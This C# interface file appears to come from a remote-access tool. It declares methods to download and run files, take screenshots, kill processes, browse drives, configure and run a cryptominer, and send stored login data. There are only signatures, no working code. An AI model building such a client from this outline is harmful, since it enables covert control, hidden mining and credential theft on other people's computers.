using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;

namespace Interfaces.Users
{
    public interface IUser
    {
        void SetCompName(string newName);
        void UploadDirectory(string dirPath, string uploadPath);
        List<string> GetLog();
        IInfoDevice GetInfoDevice();
        /// <summary>
        /// Устарело, используйте DownloadF(string FileName, string localPath)
        /// </summary>
        void DownloadFloader(string ftpPath, string localPath);
        void DownloadF(string FileName, string localPath);
        void DownloadUpdate();
        void Reconnect();
        void Disconnect();
        void RunM();
        void RunProgram(string file, string verb, string args, ProcessWindowStyle style, bool useShellExecute);
        void DownloadAndRun(string file, string localPath, string verb, string args, ProcessWindowStyle style, bool useShellExecute);
        void DeleteFile(string file);
        ISetting GetSetting();
        void SetMSettings(string ftpFloader, string localFloader, string fileName, string args, bool isMiner, DDMiners valute);
        Bitmap ScreenShot();
        List<string> GetListProc();
        void KillProcess(string procName);
        string GetKey();
        IDirectoryInfo GetDirectoryFiles(string path, string searchPattern);
        List<string> GetDrives();
        void StartChat();
        void StopChat();
        void ReadMessage(string message);
        List<LoginData> SendLoginData(string path);
    }
}
